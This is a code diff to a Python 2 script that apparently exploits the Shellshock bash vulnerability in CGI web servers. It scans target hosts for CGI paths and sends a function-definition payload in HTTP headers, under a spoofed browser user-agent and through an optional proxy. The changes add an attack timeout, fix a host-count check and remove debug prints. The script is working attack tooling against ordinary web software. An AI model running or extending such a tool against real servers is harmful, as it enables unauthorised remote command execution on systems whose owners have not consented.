@@ -75,7 +75,9 @@ sys.stdout = Unbuffered(sys.stdout)
 attacks = [
    "() { %3a;}; echo; "
    ]
-    
+
+# Timeout for attacks which do no provide an intereactive response
+ATTACK_TIMEOUT = 20
 
 # User-agent to use instead of 'Python-urllib/2.6' or similar
 user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
@@ -120,7 +122,7 @@ def check_hosts(host_target_list, port, verbose):
         except Exception as e:
             print "[!] Exception - %s: %s" % (host, e)
             print "[!] Omitting %s from target list..." % host
-    if len(confirmed_hosts) > 1:
+    if number_of_targets > 1:
         print "[+] %i of %i targets were reachable" % \
                             (len(confirmed_hosts), number_of_targets)
     else:
@@ -135,8 +137,6 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
     check. Create Request objects for each check. 
     Return a list of cgi which exist and might be vulnerable
     """
-
-    print host_target_list
 
     # List of potentially epxloitable URLs 
     exploit_targets = []
@@ -187,7 +187,6 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
             exploit_targets.append(q.get())
     
     if verbose: print "[+] Finished host scan"
-    print exploit_targets
     return exploit_targets
 
 def do_check_cgi(req, q, verbose):
@@ -267,7 +266,8 @@ def do_attack(proxy, target, header, attack, verbose):
             req.set_proxy(proxy, "http")    
             if verbose: print "[I] Proxy set to: %s" % str(proxy)
         req.add_header("Host", host)
-        resp = urllib2.urlopen(req)
+        # Times out if no response within ATTACK_TIMEOUT seconds
+        resp = urllib2.urlopen(req, None, ATTACK_TIMEOUT)
         result =  resp.read()
     except Exception as e:
         if verbose: print "[I] %s - %s" % (target, e) 
